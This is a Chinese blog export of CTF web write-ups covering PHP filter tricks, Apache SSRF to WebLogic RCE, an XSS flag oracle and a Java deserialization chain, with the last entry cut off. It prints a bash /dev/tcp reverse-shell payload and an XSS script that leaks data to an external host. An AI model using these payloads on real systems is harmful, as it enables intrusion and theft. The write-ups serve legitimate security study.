<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021强网拟态&amp;东华杯wp</title>
    <url>/2021%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81&amp;%E4%B8%9C%E5%8D%8E%E6%9D%AF.html</url>
    <content><![CDATA[<h1 id="2021强网拟态-amp-东华杯wp"><a href="#2021强网拟态-amp-东华杯wp" class="headerlink" title="2021强网拟态&amp;东华杯wp"></a>2021强网拟态&amp;东华杯wp</h1><p>最近高强度异度之刃2，摸鱼程度++（我喜欢尼娅，没有大家！），然后还当了三天校赛客服，累死。除了打些垃圾比赛基本上就没干什么了，最近打的比赛质量并不高，没法单独写wp，两场比赛碰一起了还能稍微写点东西</p>
<h2 id="强网拟态"><a href="#强网拟态" class="headerlink" title="强网拟态"></a>强网拟态</h2><p>拟态的题除了那个脑溢血hospital找不到功能点外（或者说找到了一个任意文件读但是只能读js的没用功能），剩下的题原题的原题，部署错误的部署错误，只有两个题值得写一下<br>那个zerocalc估计是个超级逃逸，本身可能是个好题，但是因为部署的问题直接白给（我就说我审了半天找不到怎么回事怎么就被打的稀烂了）<br>然后还有两个超级原题，复制粘贴打通</p>
<h3 id="easyfilter"><a href="#easyfilter" class="headerlink" title="easyfilter"></a>easyfilter</h3><p>这个题还有点意思，两个功能，写base64过的数据，和一个include，但是已经拼了前半截为<code>php://filter/resource=./files/</code><br>理论上来说直接拼到resource之后，按照常理语法就不能再使用过滤器了</p>
<p>不能用base64-decode的话，加上这里又进行了超级目录拼接和open basedir，是完全没法打的。解决的方案也很简单，下一份对应版本的PHP源码啦<br>刚好http header里也回了PHP版本，直接去GitHub上把对应版本下下来，PHP-7.2.34<br>只要能定位对应处理的源码位置就什么都好说，（幸好在哪里看到过这个东西）<br>直接定位到<code>/ext/standard/php_fopen_wrapper.c#178</code><br><code>php_stream_url_wrap_php</code>这个函数就是进行PHP伪协议处理的，跳过前面部分代码，看到这里#349</p>
<pre class=" language-C"><code class="language-C">    } else if (!strncasecmp(path, "filter/", 7)) {
        /* Save time/memory when chain isn't specified */
        if (strchr(mode, 'r') || strchr(mode, '+')) {
            mode_rw |= PHP_STREAM_FILTER_READ;
        }
        if (strchr(mode, 'w') || strchr(mode, '+') || strchr(mode, 'a')) {
            mode_rw |= PHP_STREAM_FILTER_WRITE;
        }
        pathdup = estrndup(path + 6, strlen(path + 6));
        p = strstr(pathdup, "/resource=");
        if (!p) {
            zend_throw_error(NULL, "No URL resource specified");
            efree(pathdup);
            return NULL;
        }

        if (!(stream = php_stream_open_wrapper(p + 10, mode, options, opened_path))) {
            efree(pathdup);
            return NULL;
        }

        *p = '\0';

        p = php_strtok_r(pathdup + 1, "/", &token);
        while (p) {
            if (!strncasecmp(p, "read=", 5)) {
                php_stream_apply_filter_list(stream, p + 5, 1, 0);
            } else if (!strncasecmp(p, "write=", 6)) {
                php_stream_apply_filter_list(stream, p + 6, 0, 1);
            } else {
                php_stream_apply_filter_list(stream, p, mode_rw & PHP_STREAM_FILTER_READ, mode_rw & PHP_STREAM_FILTER_WRITE);
            }
            p = php_strtok_r(NULL, "/", &token);
        }
        efree(pathdup);
</code></pre>
<p>很明显嘛，遇到filter之后先把filter后面内容拿出来，然后在这后面的内容里找<code>/resource=</code>，找到之后把后面的内容传到<code>php_stream_open_wrapper</code>，感觉就是已经到打开文件的地方了，应该没法打<br>while(p)这段是处理filter的，看到这里的pathdup，是在处理filter后进行截取的，也就是说是filter之后的内容，与<code>/resource=</code>无关<br>p由<code>php_strtok_r</code>这个函数产生，C垃圾没有太认真的去看这个函数，但是大概能看出来就是以<code>/</code>来分隔字符串，然后把得到的token进行比较，判断是以读还是写模式打开，都不是就以之前的读写模式去打开，<code>php_stream_apply_filter_list</code>就是在注册filter，就在<code>/ext/standard/php_fopen_wrapper#151</code>的位置有定义</p>
<pre class=" language-C"><code class="language-C">static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) /* {{{ */
{
    char *p, *token = NULL;
    php_stream_filter *temp_filter;

    p = php_strtok_r(filterlist, "|", &token);
    while (p) {
        php_url_decode(p, strlen(p));
        if (read_chain) {
            if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
                php_stream_filter_append(&stream->readfilters, temp_filter);
            } else {
                php_error_docref(NULL, E_WARNING, "Unable to create filter (%s)", p);
            }
        }
        if (write_chain) {
            if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) {
                php_stream_filter_append(&stream->writefilters, temp_filter);
            } else {
                php_error_docref(NULL, E_WARNING, "Unable to create filter (%s)", p);
            }
        }
        p = php_strtok_r(NULL, "|", &token);
    }
}
</code></pre>
<p>这里就是曾经WMCTF签到还是啥题的考点，对filter进行了一次url解码，不过已经不重要了，这个函数的功能就是用<code>|</code>分隔filter然后一个个注册到这个流上。</p>
<p>那么这里的代码思路就很简单，虽然会把<code>/resource=</code>后面的内容作为文件打开，但filter的注册流程是从<code>filter/</code>后开始，并不受<code>/resource=</code>的影响，且对于每个<code>/</code>分隔的内容都会被拿进去尝试注册。所以把我们要用的filter当目录拼接在路径里再跳出来，就能成功的应用上我们的过滤器<br>（这个操作本地复现其实没成功，不知道是不是不同PHP版本处理情况不一致，反正懒也就只看了这个版本的源码）</p>
<h4 id="不看源码"><a href="#不看源码" class="headerlink" title="不看源码"></a>不看源码</h4><p>题目环境还配备了很贴心的报错，随便按点什么他会直接报错显示没有这个filter，那不用看源码也能猜出来是按<code>/</code>一个个注册了。。。所以这个题出的也挺多的</p>
<h3 id="show-me-your-0day"><a href="#show-me-your-0day" class="headerlink" title="show me your 0day"></a>show me your 0day</h3><p>大概是这个名字？反正就是一个修了反序列化的typecho安装时的洞，跟了半天原来的链，发现原来的链还在，然后最后找了半天，发现原来修的是可以触发反序列化的一个点，直接把那个反序列化触发点删了。那就往后看，发现能连数据库，然后rouge mysql打通</p>
<h2 id="东华杯"><a href="#东华杯" class="headerlink" title="东华杯"></a>东华杯</h2><p>没看啥题，有一个go的题不想看，nodejs web爷爷在看但是他说搞不动就懒得看了，并且好像又是注入相关，躺平躺平</p>
<h3 id="ezgadget"><a href="#ezgadget" class="headerlink" title="ezgadget"></a>ezgadget</h3><p>没啥好说的，直接给了一个toString的defineClass+newInstance的触发点，classbyte可控，用BadAttributeValue直接进toString，一键打通</p>
<h3 id="ApachePrOxy"><a href="#ApachePrOxy" class="headerlink" title="ApachePrOxy"></a>ApachePrOxy</h3><p>Apache最新的反带ssrf的洞，只影响两个特定版本<br>具体利用和原理直接看p神的文章<br><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸</a></p>
<p>dockerfile就告诉了我们内网有一台weblogic服务器，然后搜一下就搜到了这个get rce<br><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2020-14882">vulhub CVE-2020-14882</a><br><a href="https://www.anquanke.com/post/id/221752">CVE-2020-14882：Weblogic Console 权限绕过深入解析</a><br>需要先塞4000+个破烂字符，让我们能任意重定向，而问题就出在这，我感觉题目环境本身就部署在一个奇怪的网络拓扑下，也就是我访问这个靶机本身就有一道代理，而这个过长的header会导致那个代理有点毛病，于是，并不是打不通，而是出现了一个奇怪的Nginx机器一直和我说400，点个几十下可能会有一下成功访问上，所以我先开了个本地环境确保能打通再打的远程，一通爆点之后终于弹上shell了</p>
<p>p神在文章中提到过，这个ssrf只是改变了目的地址，我们提交的参数还是会正常的发送，比如post，只要改header并加body就能把数据提交到后端，这里也一样，虽然我们用于ssrf的数据内容本来就是一个参数一类的数据了，但我们如果想继续提交get参数到后端的话，一样是用&amp;进行分割的，而不是将&amp;进行url编码</p>
<p>以及一开始总是400，我一度怀疑是我自己的问题，还专门搜了一下get rce影响的版本，并在某篇文章中看到</p>
<blockquote>
<p>weblogic的版本号一般会在&#x2F;console&#x2F;login&#x2F;LoginForm.jsp下出现</p>
</blockquote>
<p>确认一下12.2.1.3.0，完美契合</p>
<p>payload</p>
<pre><code>?unix:AAA*4100|http:/weblogic:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#39;java.lang.Runtime.getRuntime().exec(new+String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/ip/port+0&gt;%261&quot;&#125;);&#39;)
</code></pre>
<p>看了看wp，更新一下</p>
<h3 id="oldLibrary"><a href="#oldLibrary" class="headerlink" title="oldLibrary"></a>oldLibrary</h3><p>GO题，学弟看了半天和我说不会打我就摸鱼了，没看，结果赛后看wp发现是一个ssrf直接命令注入。<br>然后回头看了下，功能点在HTML转PDF中，这个是经典SSRF的攻击模式了，HTML渲染到PDF总会想办法去获取到HTML上的资源甚至是执行js脚本，打一个SSRF完全不在话下，我还记得第一次看到这个类型的攻击是在外国的fireshellCTF上，可以说是一个很有意思的攻击点了<br>进去之后flag没权限，经典setUID提权，用<code>find / -perm -u=s</code>找setUID程序</p>
<h3 id="eznode"><a href="#eznode" class="headerlink" title="eznode"></a>eznode</h3><p>高强度摸鱼的后果，这个题前半段是个SQL注入，后半段是个打hbs模板注入，而这个模板注入以前是做过的，在XCTF华为赛中出过。。。最尬的是看别人的wp里写的打这个模板注入的方法的参考链接是我自己的博客。。。。<br>先是一个经典要求注入语句等于注入结果，之前也遇到过，用一个REPLCAE语句套娃表达式通过<br>过了之后传模板并渲染，渲染的payload抄这边<br>分别对应了第五空间和XCTF华为的wp。。。<br><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs">ssti-server-side-template-injection#handlebars-nodejs</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>2021强网杯web</title>
    <url>/2021%E5%BC%BA%E7%BD%91%E6%9D%AFweb.html</url>
    <content><![CDATA[<h1 id="2021强网杯web"><a href="#2021强网杯web" class="headerlink" title="2021强网杯web"></a>2021强网杯web</h1><p>不愧是强网杯，每个方向十多个题打两天，题太多了看不过来了呜呜<br>菜鸡就做出来两个题，剩下的题甚至连看的机会都没有<br>猛男落泪.jpg</p>
<h2 id="pop-master"><a href="#pop-master" class="headerlink" title="pop_master"></a>pop_master</h2><p>这个题花的时间太多了。。。。<br>每个容器会随机生成一个超级混淆过的php文件，php文件里面有一万个类，类名和变量名也做了混淆，然后还有一些垃圾判断和垃圾赋值，然后调用自己成员变量的一个方法。</p>
<h3 id="失败的正则匹配和搜索算法"><a href="#失败的正则匹配和搜索算法" class="headerlink" title="失败的正则匹配和搜索算法"></a>失败的正则匹配和搜索算法</h3><p>一开始想直接写正则匹配函数调用，然后自己跑一个调用链出来，确实可行，然后生成payload一跑不通，debug跟入的时候发现诶，原来不止是找链，这个文件里8k+的eval，一堆的假路。这次这个就是eval前面有一个赋值，直接把eval执行的内容覆盖成了没用的字符串。摊手手<br>然后再写正则，把带赋值的垃圾eval都给删了，顺便发现for循环也有几种，一种是给参数后面拼一个字符串，可以用注释搞定没有问题，还有一种是令一个变量等于参数，也没有问题，最后一种是令参数等于一个不存在的变量，跑到这也会报错退出。<br>再写正则，都给你删了。<br>这样就能排除掉所有的问题了，现在需要的就是一个搜索算法，遍历从入口函数能调用的所有分支，最后输出能走到eval的通路。<br>算法大师登场，用python写一个dfs或者回溯都能打通</p>
<p>但是我是算法垃圾，写的回溯好像写爆了，跑不起来嘿嘿</p>
<h3 id="成功的语法分析"><a href="#成功的语法分析" class="headerlink" title="成功的语法分析"></a>成功的语法分析</h3><p>于是第二天老老实实去做语法分析，一开始看到这个题我就想起上次defcon qual的唯一web，那个是nodejs的混淆，用语法分析做的，那个混淆看都看不懂，比这次的牛逼多了，那个时候zsx神仙就教过我语法分析解混淆，最后还是发现大概能看懂混淆流程时还是语法分析来得快。看文档大概了解一下语法，安装之后靠PHPstorm的联想来写代码，能快速解决掉垃圾代码<br>就是跑的不是很快，这个垃圾代码有10w+行，PHPstorm打开的时候直接卡到炸裂，后来把这个文件标记成文本处理才好一点，跑的时候要ini_set把内存限制开到512M以上，不然语法分析的时候直接内存超限制爆炸</p>
<p><strong>整体思路还是之前的删垃圾函数，然后遍历到函数声明的时候检查函数名是否在整个文件中只存在一次，只存在一次就意味着这个函数不会被调用，也删掉，最后就能把路径清理干净</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">require</span> <span class="token string">'vendor/autoload.php'</span><span class="token punctuation">;</span>
<span class="token keyword">require</span> <span class="token string">'tester.php'</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">PhpParser<span class="token punctuation">\</span>Parser</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">PhpParser<span class="token punctuation">\</span>ParserFactory</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">PhpParser<span class="token punctuation">\</span>NodeTraverser</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">PhpParser<span class="token punctuation">\</span>NodeVisitor<span class="token punctuation">\</span>NameResolver</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">PhpParser<span class="token punctuation">\</span>PrettyPrinter<span class="token punctuation">\</span>Standard</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">PhpParser<span class="token punctuation">\</span>NodeDumper</span><span class="token punctuation">;</span>

<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'memory_limit'</span><span class="token punctuation">,</span><span class="token string">'1024M'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/if\(method_exists\(\$this->\w*?, \'\w*?\'\)\) /'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"test.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$parser</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ParserFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">create</span><span class="token punctuation">(</span>ParserFactory<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PREFER_PHP7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ast</span> <span class="token operator">=</span> <span class="token variable">$parser</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//$nodeDumper = new NodeDumper;</span>
<span class="token comment" spellcheck="true">//echo $nodeDumper->dump($ast), "\n";</span>
<span class="token variable">$traverser</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NodeTraverser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$traverser</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addVisitor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">tester</span><span class="token punctuation">(</span><span class="token variable">$parser</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ast</span> <span class="token operator">=</span> <span class="token variable">$traverser</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">traverse</span><span class="token punctuation">(</span><span class="token variable">$ast</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$prettyPrinter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Standard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$prettyPrinter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prettyPrint</span><span class="token punctuation">(</span><span class="token variable">$ast</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// echo "&lt;?php". $ret;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"result.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php "</span> <span class="token punctuation">.</span> <span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">print</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
    <span class="token variable">$parser</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ParserFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">create</span><span class="token punctuation">(</span>ParserFactory<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PREFER_PHP7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ast</span> <span class="token operator">=</span> <span class="token variable">$parser</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'result.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//$nodeDumper = new NodeDumper;</span>
    <span class="token comment" spellcheck="true">//echo $nodeDumper->dump($ast), "\n";</span>
    <span class="token variable">$traverser</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NodeTraverser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$traverser</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addVisitor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">cleaner</span><span class="token punctuation">(</span><span class="token variable">$parser</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ast</span> <span class="token operator">=</span> <span class="token variable">$traverser</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">traverse</span><span class="token punctuation">(</span><span class="token variable">$ast</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$prettyPrinter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Standard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$prettyPrinter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prettyPrint</span><span class="token punctuation">(</span><span class="token variable">$ast</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//echo "&lt;?php". $ret;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"result.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php "</span> <span class="token punctuation">.</span> <span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>最后发现跑下来全场就剩一个eval了，再用之前写的很垃圾的python脚本生成了payload打通<br>其实还可以优化一下判断一个函数调用的函数是否还存在，如果其调用的函数都不存在了就可以把它也删掉，这样子最后可能就能清理出一条完全干净的路线了吧</p>
<p>第一天全在正则上挣扎。。。。因为觉得不难可以出但是文件太大东西太多不好debug，不知道dfs到底是哪一步写错了呜呜。然后当天晚上写了个语法分析，第二天稍微改一下就出了<br>太垃圾了，这个题一开始就语法分析可能就能多点时间多看一个题了</p>
<h2 id="easyxss"><a href="#easyxss" class="headerlink" title="easyxss"></a>easyxss</h2><p>这个题其实挺简单的，难度不大，但也不算垃圾题吧，但是bot写的着实垃圾，环境也不怎么好。。。但是不知道为什么只出了十几个队</p>
<p>给了bot的代码，flag路由会把<code>req.query.var</code>和flag逐位比较，只要短的那一段和另一个相等，就返回200，否则500。<br>给了个写note的功能，但是简单试了两下xss不了，后来抓包看头发现CSP拉满，上了nonce和src&#x3D;self，那这个地方肯定就打不了了，并且仔细一点会发现这个网站的实现是无法让其他人看到你写的数据的，自己写的note并没有特殊的路由可以查看，就简单的显示在主页上，估计是绑定在cookie里了。所以就算这里能xss也没法发给bot看。</p>
<h3 id="失败的csrf"><a href="#失败的csrf" class="headerlink" title="失败的csrf"></a>失败的csrf</h3><p>然后就感觉是不是写的xss实际上是csrf。。。但是csrf有无敌的默认lax cookie做保护，虽然可以用script标签去加载然后用onerror事件看是不是500，但是lax cookie无敌，script标签不发送cookie，打不通。（这里有一个点，img标签加载内容就算返回了200但内容不能被正确解析成图片还是会触发onerror）</p>
<p>那咋办嘛，iframe也受无敌的samesite影响。打不通了，用window.open去打的话会发送cookie，但是好像没法往上面去注册onload和onerror这类事件，应该是无敌的同源策略阻止了对跨域tab的事件注册，同一个域的话就行，后来本地测试的时候发现onload就能触发一次？用location修改url也好，reload重新加载也好，就只有打开window那一下的onload是触发了的</p>
<h3 id="成功的xss"><a href="#成功的xss" class="headerlink" title="成功的xss"></a>成功的xss</h3><p>然后发现了很搞笑的xss点，在那个about界面，有一个参数theme，会直接显示在页面上，超级明显的xss点，简单试了一下，发现还有过滤，感觉就是这没跑了，一开始想闭合一下尖括号，发现左尖括号居然被过滤了，肯定是这里有诈。<br>然后查看一下这个属性出现的位置，没有左尖括号的话其实感觉如果位置不特殊就打不了了，在属性里就还有机会蹭nonce的顺风车，当时是这么想的，然后发现了一个很搞笑的漏洞点。<br>那个标题语句居然不是后端给我拼进去的，而是后端把这个语句拼进一个前端的脚本里面。。。然后前端脚本再getElementByID把标题那个element改成输入的语句。。。。笑死了<br>这个脚本当然自带nonce，过滤也不严格，过滤了fetch，src，XML之类的关键字，和一些没什么用的符号，约等于没有过滤，我甚至怀疑这个左尖括号的过滤是提示<br>并且页面还自己引入了jQuery，我直接ajax请求打爆好吧</p>
<p>接下来就很简单了，发一个ajax请求打本地，直接看状态码结果把比对结果返回回来，自己nc一下收着就行<br>理论上来说同源策略不允许获取外站的资源，但实际上同源策略是阻止的对请求的结果进行操作，毕竟有时候还是要引入外部图片什么的，内容能够拿过来，但只是js脚本不能去操作和访问罢了。而这里有无敌的CSP，CSP限制了资源的加载来源，那么违反CSP策略的将会直接被阻断，发都发不出去，所以用window.location直接离开这个页面把结果发出来</p>
<p>这里还有一个小小小坑点，就是bot访问的是127.0.0.1，而机子外网是47开头的阿里云，一开始提交的链接是让bot访问47的地址然后xss他去ajax请求本地。。。。违背CSP嗷，然后都改成127就行了。。。</p>
<p>贴脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

charset <span class="token operator">=</span> <span class="token string">"1234567890abcdef"</span>
url <span class="token operator">=</span> <span class="token string">"http://47.104.155.242:8888/report"</span>
<span class="token comment" spellcheck="true"># 6bb77f8b-6bc8-4b</span>
payload <span class="token operator">=</span> <span class="token string">'http://localhost:8888/about?theme=a";$.ajax({url:"http://localhost:8888/flag?var=flag{6bb77f8b-6bc8-4b9e-b654-8a4da5ae920^^^",xhrFields:{withCredentials:true},statusCode:{200:function(){window.location="http://ip:10000?6bb77f8b-6bc8-4b9e-b654-8a4da5ae920^^^"}}});"'</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
    send <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"^^^"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>send<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"url"</span><span class="token punctuation">:</span> send<span class="token punctuation">}</span><span class="token punctuation">,</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span>
        <span class="token string">"session=s%3Avw2FQASdXbPLqcNm-HgdXXz64gxQswqY.kvERqEcQ%2FotdZitZnFmajeNVlKmr6ntPfmRSmuYSYKU"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># XML fetch get  @%^*_+'&lt;\ src</span>
</code></pre>
<p>xss的payload写的略垃圾，只能硬对bot狂发包，老国王改了一版让js一直跑直到一位猜对返回结果，但是没有测试能不能用，其实稍微写个for循环应该也能一次跑一位吧（嘻嘻那个时候已经失去智力了，没有认真思考</p>
<p>然后点名批评一下这个bot，写的有点垃圾，bot崩溃会导致环境重启，环境重启意味着重新注册。很费时间，并且描述是5s处理一个请求，处理一个请求就把其余的请求清空？这个设计也太憨了，那不就是做题人之间对bot进行条件竞争?一开始我都是低频率请求bot，后来发现跑半天跑不出结果，最后把sleep间隔调低才跑出来，uuid这么长我跑了差不多两个小时才跑完，中途去找主办方用半边flag和payload换flag还不肯。最后环境被大家条件竞争打爆了又开始让大家用payload换flag了。服了<br>出bot题就要做好准备啊？或者让人能payload换flag嘛，一开始不给换最后给打爆了又开始了，那我不是白跑两个小时<br>（虽然我自己写的垃圾payload效率也很低也有一定的问题嘻嘻）</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>CC7 hashtable反序列化原理调试</title>
    <url>/CC7%20hashtable%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E8%B0%83%E8%AF%95.html</url>
    <content><![CDATA[<h1 id="CC7-hashtable反序列化原理调试"><a href="#CC7-hashtable反序列化原理调试" class="headerlink" title="CC7 hashtable反序列化原理调试"></a>CC7 hashtable反序列化原理调试</h1><p>本来只是对CC各链进行了简单性的写代码复习，就是大致的记忆了CC1-7的各个链触发方式和利用点，但对具体触发的流程并不甚熟悉。昨天闲的没事把templatesImpl和CC7的hashtable缝合了一下，发现payload在触发上存在着一定的问题，然后百思不得其解，然后究极debug还是发现不了问题所在，问了下rmb神仙他和我说是时候究极跟进实现了。于是今天来debug一下</p>
<h2 id="缝合代码"><a href="#缝合代码" class="headerlink" title="缝合代码"></a>缝合代码</h2><p>这份是缝合了之后看起来天衣无缝但是跑不起来的代码</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TrAXFilter<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassPool<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtClass<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InstantiateTransformer<span class="token punctuation">;</span>
